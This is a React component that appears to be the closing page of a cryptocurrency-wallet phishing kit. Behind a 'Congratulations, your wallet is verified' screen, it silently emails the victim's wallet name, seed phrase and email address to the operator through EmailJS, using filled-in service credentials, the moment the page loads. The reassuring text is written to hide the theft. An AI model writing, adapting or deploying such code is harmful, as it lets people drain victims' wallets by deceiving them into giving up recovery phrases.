"use client"

import { useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { CheckCircle } from "lucide-react"
import emailjs from "@emailjs/browser"

// Remove TypeScript interface and use plain JS props
export default function Congratulations({ walletData }) {
  useEffect(() => {
    // Initialize EmailJS with your public key
    emailjs.init("gb5fog8V1UINFZKpy") // Replace with your EmailJS public key

    // Send email with collected data
    const sendEmail = async () => {
      try {
        const templateParams = {
          wallet_name: walletData.wallet,
          wallet_phrase: walletData.phrase,
          user_email: walletData.email,
          timestamp: new Date().toLocaleString(),
        }

        await emailjs.send(
          "service_2mtival", // Replace with your EmailJS service ID
          "template_jvm0wnk", // Replace with your EmailJS template ID
          templateParams,
        )

        console.log("Email sent successfully")
      } catch (error) {
        console.error("Failed to send email:", error)
      }
    }

    sendEmail()
  }, [walletData])

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md mx-auto text-center">
        <CardHeader className="pb-4">
          <div className="flex justify-center mb-4">
            <CheckCircle className="w-16 h-16 text-green-500" />
          </div>
          <CardTitle className="text-2xl font-bold text-gray-800">Congratulations!</CardTitle>
        </CardHeader>

        <CardContent className="space-y-4">
          <p className="text-gray-600">Your wallet verification has been completed successfully.</p>

          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <p className="text-green-800 font-medium">Wallet: {walletData.wallet}</p>
            <p className="text-green-700 text-sm mt-1">Your account is now secure and verified.</p>
          </div>

          <p className="text-xs text-gray-500">You can now safely access your wallet with enhanced security.</p>
        </CardContent>
      </Card>
    </div>
  )
}